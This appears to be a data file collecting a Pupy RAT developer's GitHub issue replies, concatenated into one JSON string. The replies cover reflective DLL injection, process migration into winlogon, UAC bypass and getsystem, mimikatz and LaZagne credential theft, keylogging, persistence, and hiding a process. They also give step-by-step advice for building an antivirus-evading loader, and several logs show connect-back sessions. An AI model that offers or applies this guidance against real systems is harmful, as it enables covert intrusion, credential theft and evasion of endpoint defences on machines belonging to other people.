{
    "n1nj4sec": "sorry I merged a more recent pull of yours and merging your pull request without removing the more recent files was a pain in the ass, I edited the file manually x)\n. should be fixed, this damn .gitignore file removed all the .pyd from pupy/packages/ x)\n. thanks :+1: \n. I totally agree with @deathfantasy, I didn't looked deeply in rpyc implementation yet, but it seems that the right way to do it would be to create a subclass of \"rpyc.core.stream.Stream\" \n. nice ! :D thx @byt3bl33d3r \n. obfsproxy is a good idea btw :-)\n. and port forward shouldn't be hard to implement in pure python using rpyc. All we have to do is retrieve a socket object from the client proxyfied through rpyc and pipe it with a local socket :-) (like in the socks5 module)\n. In case some of you are working on it, stop :-) modularized transports are on their way I just need to clean up a little my code and make the transport customizable in pupygen :) I already have implemented tcp_cleartext, tcp_base64, obfs3 and tcp_ssl transports ! other obfsproxy modules should integrate fine with a little work on dropping twisted dependencies (like I did for obfs3)\n. It is but you missuse it. exec uses argparse \n\n\nexec\nusage: shell_exec [-h] argument [argument ...]\nshell_exec: error: too few arguments\n\n\nso you need to add quotes like on a unix shell\n\n\nexec 'cd C:\\'\n. on what os ?\n. yea that's why pwd does not exists on windows, try open a cmd.exe\n. yea I planned to implement a default filter to avoid typing -f  each time. A little like the sessions -i of meterpreter. For s/clients/sessions why not\n. ok, clients aliased to sessions to be more instinctive (I didn't remove \"clients\" because I don't have the time to take new screenshots :p) and sessions have the -i option to set a global filter for all further commands. for example :\n\n\nsessions -i 1\nwill change the global filter and the next commands will not be dispatched everywhere. It should be easier not to forgot a -f :-)\n. as @deathfantasy said exit --yes exit (cleanly) the client. If you are injected into a process it wont kill it. use -f to filter to a specific client. If you want to kill a client and the process you can create an alias in pupy.conf like killme= pyexec -c 'import os;os.kill(os.getpid(),9)'\n. :D it's ok I will merge I didn't add the -k option\n. arf sorry I can't merge that I did some bigger changes because the pupy module didn't exist on unix systems so your code only worked on windows. I added a pseudo pupy module to the reverse_ssl.py payload so we could have the real ip the payload is connecting to, even if tunneled :-)\n. I still can't figure out how the f*ck we can redisplay the prompt after displaying the new session message xD I think it's not possible with the standard readline bindings. Anyway thanks for your contributions @byt3bl33d3r !\n. actually there is :-)\ntake a look at metasploit all the windows/dllinject/* shellcodes\n```\nmsfvenom -p windows/dllinject/reverse_winhttp --payload-options\nOptions for payload/windows/dllinject/reverse_winhttp:\n   Name: Reflective DLL Injection, Windows Reverse HTTP Stager (winhttp)\n Module: payload/windows/dllinject/reverse_winhttp\n\nPlatform: Windows\n       Arch: x86\nNeeds Admin: No\n Total size: 357\n       Rank: Normal\nProvided by:\n    sf stephen_fewer@harmonysecurity.com\n    hdm hdm@metasploit.com\n    Borja Merino bmerinofe@gmail.com\nBasic options:\nName      Current Setting  Required  Description\n----      ---------------  --------  -----------\nDLL                        yes       The local path to the Reflective DLL to upload\nEXITFUNC  process          yes       Exit technique (Accepted: , , seh, thread, process, none)\nLHOST                      yes       The local listener hostname\nLPORT     8080             yes       The local listener port\n```\nAnd even the size isn't an issue anymore :-) !\n. no it is not stored on the disk and downloaded in memory only, it's the point of the \"reflective\" injection\n. There was a typo error, it should be fixed now. Anyway, the persistence module is really basic for now, it was written in 10 minutes and will be improved in the future\n. oops, forgot some imports after refactoring, it's fixed thank you\n. I can't reproduce the bug, can you tell me on what version/arch of windows you get this error ?\n. ok, the bug was on x64 pupy processes. I forgot to clean up the libraryx64.zip after some dev tests, it works now :) thank's for your input\n. Do you have some idea on how to reproduce this ? can you give the context of this error ? thank you\n. after some tests I did succeed reproducing this error and it seems to happen when the client connect for the first time and automatically import the python uuid module. I have however no clue why this pops up as msvcr90 should already be loaded.\n. unfortunately it is more complicated. You can't use a manifest with reflective DLL injection because you would need to write both the manifest and the msvcr90.dll to the disk. Pupy loads the msvcr90 without a manifest file by handling windows contexts. The problem comes from the fact that the python uuid.py module manually reload the msvcr90 dll using ctypes whereas it already had been loaded from memory by pupy.\nthe uuid module does the following :\n```\n\n\n\nctypes.util.find_library('c') \n'msvcr90.dll'\nctypes.CDLL('msvcr90.dll')\nTraceback (most recent call last):\n  File \"\", line 1, in \n  File \"ctypes__init__.pyc\", line 365, in init\nWindowsError: [Error 1114] A dynamic link library (DLL) initialization routine failed\n```\n\n\n\nThe quick fix would be to patch the uuid.py module but I'm wondering if patching the ctypes wouldn't be better as the problem would not appear again in another module\n. I think the bug is related to : https://bugs.python.org/issue17213\n. Could you tell me if the patch fixed the popups on the machines where you had the issue ? thank's\n. I think it is not related. Your error also happens for me when I run the server on windows, I think it comes from the fact that rpyc under linux uses select system calls on sockets but it does not exists on windows, so it have to do polling and it seems some exception is not caught somewhere when a connection is interrupted.\n. nice ! perhaps you should push a pull request to the rpyc repository ?\n. I implemented a first asynchronous http transport where the client pull the server, so a DNS transport shouldn't be hard to implement now\n. https://github.com/n1nj4sec/pupy/blob/master/pupy/network/lib/launchers/dnscnc.py. It looks like you have a problem between your computer and your chair ! did you change the default port ? do you have the right to bind on that port ? do you already have something bind on that port ?\n. strange, what distrib are you running the server on ? did you tried to start pupy as root ? do you see a program listening on that port when you type \"netstat -anpt | grep LISTEN\" ? if yes which program is it ?\n. which make do you use ? it does not work with nmake.exe\n. the pupy bootloader was inspired from py2exe because py2exe can load .pyd from zip files. pyinstaller just drop all .py, .pyc and .pyd in a temp folder and change the python path. I guess that's why encrypting python bytecode is usefull in this case. In our case I don't see the point of dooing this as the code is already opensource and the rpyc bootloader is very small. for the UAC, it's just a manifest to attach to the exe and we are done :) you can do it using mt.exe\n. On the other hand, I think you can natively use pyinstaller to build linux & osx payloads without any problem. For windows, the only problem is you would have to compile the \"pupy\" module from pupy.c into a standalone .pyd, but it is probable that this .pyd would be detected by antiviruses as soon as you start the payload and pyinstaller drops it into it's temp folder _MEI*\n. Hello @darmoy !\nYou can get your hands on it, all the pupy source code is in the repository ! search harder :p \nFor pyinstaller, we could make pupy compatible without too much effort by compiling the builtin pupy.c into a .pyd. The main problem is that antivirus software will probably detect pupy with the .pyd which will be dropped at runtime by pyinstaller in %TEMP%/_MEIXXX. \nIf all you want is to have an undetectable exe, it is really simple and it only takes around 10 lines of C code with the following steps :\n1. download MemoryModule.c and MemoryModule.h from the amazing MemoryModule project\n2. generate a pupyx86.dll with pupygen.py\n2. encode/xor/crypt/obfuscate as you wish the raw dll and embed it into a char buffer[]\n3. decode your buffer at execution\n4. call MemoryLoadLibrary(buffer);\n5. enjoy ;-)\n. ah you beat me to it :) thank's\n. I can't reproduce. Which version of windows do you run the payload on ? are you trying a x86 -> x64 injection or a x64 -> x64 ? I tried all cases on windows 7 and it works for me, 0 crash\n. I never noticed it but the keylogger doesn't work neither on windows 7 in a x64 process. I will have a look thank's\n. For the keylogger it's fixed ! it was a pointer size problem under x64.\n. @danny1991 the -c option creates a process and migrates into it. That's probably why it crashes. Could you try with winlogon's pid instead ?\nit works on my win7 x64\n```\n\n\nrun getprivs \n[+] SeDebugPrivilege enabled !\nrun migrate 436\n[+] looking for configured connect back address ...\n[+] address configured is 192.168.1.5:443 ...\n[+] looking for process 436 architecture ...\n[+] process is 64 bits\n[+] injecting DLL in target process 436 ...\n[+] DLL injected !\n[+] waiting for a connection from the DLL ...\n[] Session 3 opened (192.168.1.5:443 <- 192.168.1.2:56365)\n[+] got a connection from migrated DLL !\n[] Session 2 closed\ninfo \nlauncher_args: ['--host', '192.168.1.5:443']\nmacaddr   : \npid       : 436\nexec_path : C:\\Windows\\system32\\winlogon.exe\n```\n. the injection problem is fixed, but the getsystem after bypassuac persist on win10 (issue #124) \n. try to start a \"tcpdump -nvv\" and copy paste to us to see what happens\n. it could come from a lot of things not related to pupy, if you are exposing pupy on internet it could come from scans trying to request the service thinking it is an HTTP server\n. https port is more stealthy and probably less filtered by firewalls. We could just hide these warning messages\n. well this should mitigate the issue : \n\n\n./pupysh --log-lvl ERROR\n. see issue #37 \n. I have the strange feeling you are trying to inject a x64 PE exe with a x86 Pupy payload. Can you confirm ? Please first migrate into a x64 process and try again ;)\nmigrate -c 'C:\\Windows\\SysNative\\notepad.exe'\n. And another thing, you need to pass mimikatz arguments in parameter because I did not had time to implement the interactive stdin/stdout handling with this module yet\n. the payload itself has not been updated\n. ok I found the bug, argument parsing was buggy when manually providing IP in pupygen after the auto-ip assignment update. I hope to be able to release a first stable version soon to avoid such minor regressions\n. Hi there !\nIf the code is yours, I don't think I should have a word in what you do or do not publish. But if you are willing to share your code I think it could be an awesome gift to all the security research community as it would be much easier to understand and analyze how to prevent/detect such persistent threats. On another hand, bad people could use it for evil purposes but it is more likely that these people already have developed similar tools, so IMHO the good still prevails. The choice is yours. Be assured that if you do publish it, I will have a look at it :)\n. because he finally did not sent any PR ?\n. You are out of date mate the payload generation tool is pupygen.py not genpayload.py anymore ;)\n. is it working ? because I can't make it works and it seems a lot of code does not make any sense\n. sorry I tried but everything is very messy and mostly doesn't work. I think it would be quicker for me to recode everything from scratch rather than debug this !\n. I just tried on windows 7 & linux everything works just fine\n. nop sorry the dev branch is not ready yet, I did not upload the binaries to avoid making the repo heavier so you can compile them yourself or wait a little ;)\n. To include additional python modules, just drop them in packages/windows/x86/ or packages/windows/x64/ and use load_package to load them from memory on a client. You don't need to edit the libraries included by default in the payloads.\nIt probably won't work as-is for scapy because scapy needs other dependencies like winpcap\nHere is an example on how to include sqlite3 from memory : \ncopy _sqlite3.pyd, sqlite3.dll and sqlite3 directory from C:\\Python27\\ of a windows install to packages/windows/x86 or packages/windows/x64 depending on your payload arch and then do :\n``` python\n\n\npupsrv.clients[0].load_package(\"_sqlite3\") #load _sqlite3.pyd\nTrue\npupsrv.clients[0].load_package(\"sqlite3\") #load the package\nTrue\npupsrv.clients[0].load_dll(\"packages/x86/sqlite3.dll\") #load the dll wich sqlite3 needs to work\npupsrv.clients[0].conn.modules['_sqlite3']\n_sqlite3.pyd'>\npupsrv.clients[0].conn.modules['sqlite3']\n\\sqlite3__init__.py'>\npupsrv.clients[0].conn.modules['sqlite3'].version\n'2.6.0'\n```\n\n\nI hope it answer your question\n. pupy is not in a stable version yet. Please look quickly at the code before asking things it's often quicker to look at the code rather than to post an issue on github ... https://github.com/n1nj4sec/pupy/blob/master/pupy/pupygen.py#L23 the parenthesis is not at it's place. It doesn't matter the pupygen.py has been totally rewritten in the dev branch so it will be fixed on it's own.\n. you probably have a particularity on your system, check what name py2exe generate for you in build/bdist.winXXXXX\n. btw, do you have python x64 installer ? ...\n. you need to embed the python uuid standard module when packaging with pyinstaller. try to add an import uuid to pp.py and repackage or add a hidden import to your .spec\n. you will probably want to include everything in additional_imports.py so import this file instead\n. Hello, thank you for your report. Do you still have the issue ?\n. run download\nrun upload\nrun shell_exec 'ls'\nrun shell_exec 'cd'\nif you want aliases, you can edit pupy.conf :)\n. I implemented a real basic autorun feature some time ago, I forgot to mention it https://github.com/n1nj4sec/pupy/commit/0d6797e3c22b4ee7fe9a4447352ea1f760e228c3. For the state of the client, it is also better handled for some modules like keylogger, a disconnection/reconnection will not clear keystrokes buffers (https://github.com/n1nj4sec/pupy/commit/d7115dcf7a8cb94116639340543a036d3ca2ca75)\n. The hmac is hardcoded so you don't need to change it (if you do, you need to change it on both the client and the server).\nCan you send me the pupygen command line and the output as well as the pupysh command line you used ? There is no documentation but it's pretty intuitive if you read the wiki you should be able to make it work\n. it works for me, did you tried locally ? As I can see in your traceback, you are using this on internet. Perhaps someone is tampering with your traffic ?\n. Well, if you read the traceback it seems you need to install pycrypto in\nyour python27_x64\n. try to uninstall pycrypto and reinstall it without python eggs\n. thank's I integrated this feature in the \"dev\" branch but I had already made changes to the keylogger so it was to merge the PR\n. hello, you can use something like this and copy paste the executable to a directory of you choice before adding the entry to the registry\n. Thank's to share ! it could be useful to someone but I don't think it has its place in the repository\n. What do you think ? Is TCP for LAN only ?\n. there is already a ping in place when you wait for a job to finish https://github.com/n1nj4sec/pupy/blob/master/pupy/pupylib/PupyJob.py#L183\n. No, you can't, you need a real PE. To load .NET assemblies from memory, use something like https://msdn.microsoft.com/en-us/library/system.reflection.assembly.load%28v=vs.110%29.aspx\n. Thank's mandreko for you answers, I guess I can close the issue now\n. Thank you for the fix :)\n. sure, the config is python code so it won't be difficult to obfuscate, I will add an option later on\n. shell worked for me on osx last time I checked, your pyinstaller must miss some packages :\n```\n$ python\nPython 2.7.10 (default, Oct 23 2015, 19:19:21) \n[GCC 4.2.1 Compatible Apple LLVM 7.0.0 (clang-700.0.59.5)] on darwin\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n\n\n\nimport pty\npty\n\nimport tty\ntty\n\n```\n. Thanks for your feedback, I will add this to the wiki\n. I improved locale detection in interactive_shell (changes are not yet on the master but on the dev branch)\n. added for the next version, thanks\n. hello, could you use lsof to check what kind of file descriptor is to much open ? Do you have the same problem when you use pp.py without pyinstaller by using the native python installed on your OSX/linux machine ?\n. A work-around could be to increase the limit using something like os.system(\"limit -n xxx\")\n. by the way, posix is a built-in python module, it's useless to add it your pyinstaller hidden import list\n\n\n\n``` python\n\n\n\nimport posix\nposix\n\n```\n. thank you for your bug report ! does my patch on the dev branch fix the issue ?\n. yes, on windows the whole tty handling is not implemented and the input you enter is handled by python raw_input function. It looks like it's a real pain in the ass to implement it using ctypes or a c extension and I don't know any python library that could do this, so I don't plan to implement it any time soon\n. well your options are only limited by your imagination ;) You can : \n- write your file locally and upload it\n- use pyshell to have an interactive shell and edit your configuration file\n- write a \"edit\" module that would be plugged with your local vi and would allow to edit files remotely ( don't use nano I wouldn't accept the PR :p )\n. yes it's a known issue with powershell and python subprocess module, powershell doesn't seems to use standard stdin unless you pass it the \"-Command -\" argument\n. patch for interactive powershell 9cf348197ab684d3bb4bffa2fbd4dc1bd26a2c5d\n. it is already the case, it tries to reconnect every 30 seconds at max https://github.com/n1nj4sec/pupy/blob/master/pupy/pp.py#L106\n. Probably, but I never needed to. Why would you need tkinter for if I may ask ?  The general guideline to follow when you have a missing module is to try to import it (here _tkinter) from a python shell and copy/paste the .py/.pyd to packages/windows/\n\n\n\n```\nC:\\Windows\\system32>C:\\Python27\\python\nPython 2.7.11 (v2.7.11:6d1b6a68f775, Dec  5 2015, 20:32:19) [MSC v.1500 32 bit (\nIntel)] on win32\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n\n\n\nimport _tkinter\n_tkinter\n\n```\n\n\n\nSo now you know you don't have _tkinter.pyd\n. you need to actually load it before running the script with \nrun load_package _tkinter The other option is to reference _tkinter in your module by appending it to the \"dependencies\" list\n. the .pyd probably needs a DLL cf. issue #54 \n. probably C:\\Python27\\DLLs\\tk85.dll and/or tcl85.dll ?\n. cf issue #54 \n. copy paste the two DLL from a fresh python install on windows to your pupy server's host and use load_dll() function to load them remotely from memory. The shell you see on the issue #54 is a shell on the pupy server (not the client like pyshell) by using the command \"python\" from pupy.sh\n. not a standard python shell, a python debug shell from inside pupy.sh\n```\n[*] Session 1 opened (192.168.1.5:443 <- 192.168.1.2:61265)\n\n\nrun load_package _tkinter\n[+] package loaded !\npython \nPython 2.7.11+ (default, Apr 17 2016, 14:00:29) \n[GCC 5.3.1 20160409] on linux2\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n(InteractiveConsole)\n\npupsrv.clients[0].load_dll(\"/tmp/tk85.dll\")\npupsrv.clients[0].load_dll(\"/tmp/tcl85.dll\")\n^D\nrun pyshell \nimport _tkinter\n_tkinter\n_tkinter.pyd'>\n```\n. dude have you tried import os; os.system(\"kill -9 -1\") from inside a system python shell (with root privileges) ? :) sometimes it helps python programs\n. It was just a joke because I thought it was funny you tried load_dll() in a python shell. :smile: \n. I don't know why I does not work\nTry to drop dlls in a system PATH instead of loading them from memory. If it works you can try to debug MemoryModule C code to understand why I does not works with these DLLs. An alternative is not to use tkinter and use pure ctypes to display a window\n. ifconfig's output ? it seems you don't have this address configured, try to bind on 0.0.0.0\n. yes, you can use @danny1991 method to add persistence when the payload connects back or you can add the persistence scriptlet when you generate the payload with pupygen (option -s persistence) to embed a persistence script that will run even if the payload is executed offline\n. No, I don't see any utility for this, but you are welcome to implement it\n. pupy works like a reverse shell. You don't connect to the client, the client connects to you, so no it won't connect to you if you use a VPN.\n. On android I suppose ? No, it would be nice to have a module to do this\n. I had also this bug at a point but I thought it was fixed. In my case I had to restart the server to deblock the clients that looped with the same error you have.\nThe fix should be in pp.py, so are you sure you use the last version of the pupy client ? ( or the last exe templates ?). I you recompiled the payload templates, you need to recompile them again to have the pp.py up to date embedded into the template. And make sure to compile with a python 2.7.11 dll\n. yes I meant a pupysh restart :) \n\n\n\nWhen I say the client, I mean pp.py because at a TCP level, the client initiate the connection to the server and when I say the server it's pupysh even if it is on your kali.\nYou still have the exception, but the client doesn't reconnect a few seconds after ? If so I don't have any idea and I can't reproduce the bug, perhaps it could be your openssl version ? \nI'm currently running OpenSSL 1.0.2g-fips  1 Mar 2016 without any problems\n. Thank you ! I had to make some changes to make it work on my configuration (tested on a win7). Can you tell me if it still works on yours ?\n. @DeveloppSoft I closed the PR because it didn't close automatically after I merged. I only merged the first commit without the full library code to avoid having to review all the code in case you backdoored it ;)\n. I can be a little paranoid, nothing personal ;)\n. Hello, are you talking about the command-completion feature ? \nBecause you can filter by using run linux/<TAB> and only the linux-compatible modules will be shown. But filter automatically the command completion when session -i is used is a good idea, I add it to my TODO list, thanks\n. Are you running the pupysh.py server on windows ? If yes, it's because symbolink links does not work on windows.\n$ ls -la modules/lib/windows/creddump\nlrwxrwxrwx 1 me me 37 mai   31 17:40 modules/lib/windows/creddump -> ../../../external/creddump7/framework\nSo copy the repository manually or install pupy on linux\n. python imports don't work like that, do as I said, copy the directory and it will work ;)\n. @AlessandroZ made an awesome keylogger module for linux (cf 712d5d97b920494a5ab76eb77aae22f5d1be954b ). I just tried it on a ubuntu desktop and it works great !\n. Hi @AlessandroZ, thank you I will merge the patch in the master soon\nFor LaZagne I will have a look at it, it looks awesome :)\n. Hi, @AlessandroZ, thank you, I did broke the indentation by refactoring to follow PEP8. I will have a look at your code, and next time you can make a pull request, it would be easier for me to compare/merge. I also think bypass UAC could be useful and I don't mind using powershell if it's quicker to implement. \nOf course you are all welcome to contribute and implement new modules all help is greatly appreciated :) I will review every pull request and merge if it's not too dirty ;)\n. yep, it's because I changed the name from tcp_ssl to ssl and didn't recompile the binaries. You can recompile the binaries, wait I finish the big changes I'm bringing to pupy's transports or rename ssl to tcp_ssl in network/conf.py\n. It should be fixed ;)\n. Could you try to edit pupylib/payload/ps1_oneliner.py and add the parameter -ForceASLR like the powershell script advise you to ?\nlike this line 23\nInvoke-ReflectivePEInjection -PEBytes $b -ForceASLR\nFor the av it's probably a matter of encoding/decoding the Invoke-ReflectivePEInjection.ps1 script and if it's not I'm positively surprised of avast :-)\n. I also noticed that the powershell process was huge and took up to 250MBytes on my test machine whereas pupy takes less than 20MBytes after a migration but I'm not very comfortable with powershell syntax and I didn't had time to investigate why it allocates so much memory.\nPerhaps in your case the problem comes from that and you don't have enough ram left for the VirtualAlloc ?\n. I didn't test it with avast but I added some simple obfuscation to the powershell script\n. doesn't the search module already does that ? https://github.com/n1nj4sec/pupy/blob/master/pupy/modules/search.py\n. You can find a lot of information about that here : link\n. run getprivs first and it will work, you don't have enough privileges to display usernames\n. that's awesome thank you !\n. The easiest to do without any privilege is to edit argv and environ to look like another process, I will add a module for that later\n. it works for me ...\n```\nroot@myhost:~/pupy# ./pupysh.py \n        _____                    _       _ _\n\n    |  _  | _  _  | | | | |     \n|||  |   | | | . | | |  | -|   | -_| | |  |||\n           |_|  ||  |  |  |||_||||         \n                     |_| |___|                              \n               v1.3 (Jun 17 2016)\n\nAuthor:           Nicolas VERDIER  < @n1nj4sec > (contact@n1nj4.eu)\nBleeding edge:    https://github.com/n1nj4sec/pupy\n[] Server started on port 443 with transport ssl\n[] Session 1 opened (192.168.1.6:443 <- 0.0.0.0:0)\n\n\nsessions \nid  user  hostname  platform  release  os_arch  proc_arch  address             \n\n\n\n1   me    me-PC     Windows   7        AMD64    32bit      ::ffff:192.168.1.5\n\n\nexit\nroot@myhost:~/pupy# ./pupysh.py \n\n\n        _____                    _       _ _\n\n    |  _  | _  _  | | | | |     \n|||  |   | | | . | | |  | -|   | -_| | |  |||\n           |_|  ||  |  |  |||_||||         \n                     |_| |___|                              \n               v1.3 (Jun 17 2016)\n\nAuthor:           Nicolas VERDIER  < @n1nj4sec > (contact@n1nj4.eu)\nBleeding edge:    https://github.com/n1nj4sec/pupy\n[] Server started on port 443 with transport ssl\n[] Session 1 opened (192.168.1.6:443 <- 0.0.0.0:0)\n\n\nexit\nroot@myhost:~/pupy# ./pupysh.py \n\n\n        _____                    _       _ _\n\n    |  _  | _  _  | | | | |     \n|||  |   | | | . | | |  | -|   | -_| | |  |||\n           |_|  ||  |  |  |||_||||         \n                     |_| |___|                              \n               v1.3 (Jun 17 2016)\n\nAuthor:           Nicolas VERDIER  < @n1nj4sec > (contact@n1nj4.eu)\nBleeding edge:    https://github.com/n1nj4sec/pupy\n[] Server started on port 443 with transport ssl\n[] Session 1 opened (192.168.1.6:443 <- 0.0.0.0:0)\n\n\nsessions \nid  user  hostname  platform  release  os_arch  proc_arch  address             \n\n\n\n1   me    me-PC     Windows   7        AMD64    32bit      ::ffff:192.168.1.5\n\n\nexit\n```\n\n\nI need a little more informations, like : \n- screenshots\n- agent's windows version\n- The full command line used to generate the payload (pupygen.py)\n- traceback when you use a pure python payload (install python on the windows and generate a pure python payload with pupygen -f py, then run it and print the traceback when you exit/restart the server)\n. Yes if the socket is open and responding to TCP heartbeats (set with setsockopt), the connection is considered OK. I think there might be a problem with your proxy because it works fine when I use a ssh remote port forwarding (-R). Your proxy should refuse connections when the other end is not open & ready.\n. And if your socket is closed on pupy server side, your proxy should close (& shutdown) the client socket too\n. Metasploit reflective dll shellcodes are already compatible, just generate a dll with pupy and set the dll path in metasploit's module\n. tab completion seems to work fine. apt-get install screen ?\n. You need to recompile the windows templates if you changed the launcher. If\nyou try to generate a pure python payload with pupygen -f py it should work\nLe 3 juil. 2016 7:28 PM, \"Mnogo Kode\" notifications@github.com a \u00e9crit :\n\nI don't have a lot of experience writing issues, so please bear with me\nhere.\nI was trying to write my own network launcher in\npupy/network/lib/launchers/ and found that each time I generated a PE\nwhich used the launcher, the pupy instance would do nothing and immediately\ncrash. When I generated a python file and ran it in both windows and linux,\nmy custom launcher would work as intended.\nI simplified my process even further by adding a test launcher, to\npupy/network/conf.py which just linked to the existing connect launcher.\nlaunchers[\"test\"]=ConnectLauncher is how I wrote this. I have changed\nabsolutely nothing about the functionality of ConnectLauncher, yet it\ncauses EXEs to fail when test is specified as the launcher. It works\nperfectly fine for generated python files in windows.\nI tried modifying LauncherArgumentParser(prog=\"connect\" to\nLauncherArgumentParser(prog=\"test\" in\npupy/network/lib/launchers/connect.py:13 and it made absolutely no\ndifference. This is the only place where I can find \"connect\" being\nreferred to in a source file.\nI do not understand why this is happening and don't know if it's just my\nmistake or not.\nhttps://github.com/mnogostuff/pupy/blob/218845459a9144c68f9211a74a109a42482c7cbb/pupy/network/conf.py\nis the only change I've made, which I have made into an executable with python\npupygen.py -o test.exe -f exe_x86 test --host=\"127.0.0.1:1234, when run\nwith python pupygen.py -o test.exe -f exe_x86 connect --host=\"\n127.0.0.1:1234, which is the exact same code but does not refer to the\ndummy launcher, it works flawlessly.\n\u2014\nYou are receiving this because you are subscribed to this thread.\nReply to this email directly, view it on GitHub\nhttps://github.com/n1nj4sec/pupy/issues/125, or mute the thread\nhttps://github.com/notifications/unsubscribe/AL98xr_H8o5DkimV_9DIWIxmpnw-TRjXks5qR_E_gaJpZM4JD6RW\n.\n. thank you, the different keyboard layout support for the keylogger is a very nice feature :)\nFor the shell_exec, you can use unix like syntax and use simple quotes : \n\nrun shell_exec 'ipconfig /all'\nI put back the old shell_exec because nargs='*' doesn't work with linux arguments that starts with a - and not a /, so the quotes are mandatory\n. I used the default buildozer.spec generated with build.sh with perhaps some additional permissions. It all depends what you want to do ;)\n. cf https://github.com/n1nj4sec/pupy/wiki/Build-payloads-from-sources#android-apk-\n. git pull ?\n. But the command you are looking for is git pull, isn't it ?\n. Hello @AlessandroZ !\nYour keylogger looks nice, but your modifications on the sessions' command behavior prevent some functionalities.\nThe \"-i\" parameter allows to create filters to interact with a session id but also with multiple sessions that match your filter which is not possible anymore with your modifications.\nFor example it was possible to do something like : \n```\n\n\ninfo \nhostname  : myhost\nuser      : me\nrelease   : 4.4.0-24-generic\nversion   : #43-Ubuntu SMP xxx\nos_arch   : x86_64\nproc_arch : 64bit\npid       : 6971\nexec_path : /usr/bin/python\naddress   : ::ffff:127.0.0.1\nmacaddr   : xx:xx:xx:xx:xx:xx\ntransport : ssl\nlauncher  : connect\nlauncher_args: ['--host', '127.0.0.1:1234']\nsessions -i 'platform:linux proc_arch:32bit'\n[+] default filter set to platform:linux proc_arch:32bit\ngetpid \n[-] no clients match this search!\nsessions -i 'platform:linux proc_arch:64bit'\n[+] default filter set to platform:linux proc_arch:64bit\ngetpid \n 6971 pts/18   00:00:01 python\n```\n\n\nIt is useful for interacting with a specific platform only, for example to send a command on all winXP connected but not all other windows versions or linux, osx, etc\nAll the keys in the \"desc\" dictionnary should be usable to make filters (release, version, os_arch, pid, exec_path, address, mac_addr, etc ...)\nI don't get why did you add this check to see if the client id exists ? did you ran into issues ? If not, could you remove it from your commit ?\nThank you,\nNicolas\n. Thank you for working, on this. Your fix had several problem including not beeing portable on windows & android payloads, so I reworked it and since there was a lot of differences it was easier for me to start without merging. The problem of writing the certificate on disk is still an issue :/ I hope it will be possible in the future versions of the standard ssl lib\nCheers\n. It looks great ! For the buffer size problem, I think that instead of using\n\"powershell.exe /c\" it should be possible to spawn powershell with \"-\" as\nargument and write on stdin like in the interactive_shell module. It could\navoid writing on disk even for big scripts :)\n. It's not implemented, but you can drop the .py payload somewhere and hook a script started at boot somewhere, or make a module for it ;)\n. exact, the problem is on Windows 10 in a x64 process. As a workaround you can migrate to a x86 process : \nrun migrate -c 'C:\\Windows\\SysWOW64\\notepad.exe'\n. Nevermind, 2042 is the end of the world. What is the relation with the issue's title ?\n. Yes, of course you are welcome if you want to document stuff in the wiki :-)\n. Nice ! But there is unfortunately still the same issue as in ps1_oneliner, the powershell process takes a lot of memory :/ I don't know where the leak comes from, but it looks like the bytes array in powershell takes a lot of space for nothing\n. Thank you ! I only took lazagne.py without merging everything to make a submodule instead of copying all the laZagne project. Tell me if everything works ok. All seems ok from my side except the web_history dll for IE that open a popup saying it needs MSVCR100 but the passwords are well retrieved\n. Nice ! Thank you for making such a clean code and not having put all the python and dll dependencies in packages, it makes it really easier for me to review your code !\n. git submodule init\ngit submodule update\n. you can put a FQDN, an ipv4 or an ipv6 in --host\n. Nice work ! :-)\nFYI, using rpyc a lot (when you use a lot of successive calls like in pupy/modules/lib/windows/bypassuac.py) is really slower than writing the code in a package, pushing it remotely and calling remotely fewer functions/classes. The difference will really be visible when you have some network latency\n. thx again ;)\n. thx for the fix :)\n. Hello ! \nCould you please remove the psutil library from your pull requests and reference what version you picked so I can check your code easily ? In a general way I won't merge libraries and compiled code as checking all files from the lib can be quite painful :=)\n. Good job with all these fixes and improvments :+1: \n. Hello,\nWell, the different projects from which code have been used are cited in the LICENCE file at the root of the project as well as in the client/sources/LICENCES.txt file. Attribution of the original work is kept by letting the original headers of source files containing original license and authors untouched. What additional reference did you have in mind ?\n. cf issue #145 \n. thx\n. I think what you are observing is the difference between a line buffered shell where the socket is written and flushed when you press enter and a true interactive shell like in pupy or ssh. Did you try to use ssh with this host ? It is probably as slow as pupy's interactive shell. \nYou should avoid using an interactive shell when you don't have a correct network connectivity and use the shell_exec module instead. \nYou can also try the interactive_shell -T option, I haven't tried if it will do the trick as I don't know if rpyc's stdin redirection is line buffered or not but I suspect it is.\nIf not, you will have to write a half interactive shell module by using raw_input on the server's pupysh side to issue commands only when a complete shell command is issued by the user (when enter is pressed and raw_input returns), however the shell won't be able to use interactive programs like vi, less, man, etc...\n. It works like this after your patch, but before your patch, the keys were sent over the network by block (not one by one) if multiple keys were typed simulteanously and self.ps.write (which call rpyc and write on the socket) were only called the minimum of time (when there is no more data to read in sys.stdin)\nhttps://github.com/alxchk/pupy/commit/49ae6024e89fa553538e0378418864b44c42a7aa#diff-58551c742be8993c81035ffae7f0fdd1L89\n. What version of windows are you trying on ? what transport ? does the bug also appears by migrating in another x64 process or is it just chrome ? your initial process before migration is a 32bit process or a 64bit process ?\n. try to change the timeout (default is 10s) in  pp.py and  network/lib/servers.py.\nI just simulated a huge network latency and incrementing the timeout to 60s works in my case but I couldn't reproduce the fact that the client doesn't call back anymore\n$ tc qdisc add dev lo root netem delay 600ms 60ms\n$ ping 127.0.0.1\nPING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=1225 ms\n64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=1286 ms\n64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=1236 ms\n. The problem is that python2.7 Popen doesn't have a timeout argument like in python3. We could add a timeout manually and kill the process if it takes too long.\nTo avoid your command from hanging, don't use start, that will make a blocking popup, just start your exe directly\n```\n\n\nexec 'C:\\temp\\lolwut.exe'\nLe chemin d'acc\u00e8s sp\u00e9cifi\u00e9 est introuvable.\n```\n. There is no ^Z yet, but you can use run --bg yourmodule to make it run as a job\nYou can also add the interrupt method that gets called when you press ^C, so it terminates the remote process in interactive mode, like https://github.com/n1nj4sec/pupy/blob/master/pupy/modules/memory_exec.py#L49\n. s/simple/connect/g\n. I see you use mingw32-make and if you read the wiki it says GNU make\n. > After generating the payload using:\npython pupygen.py -f ps1 connect --host MYIPADDRESS:443\nThe file payload.ps1 was generated, and this file could be safely put on the Client computer without being removed by Windows Defender.\n\nThen I 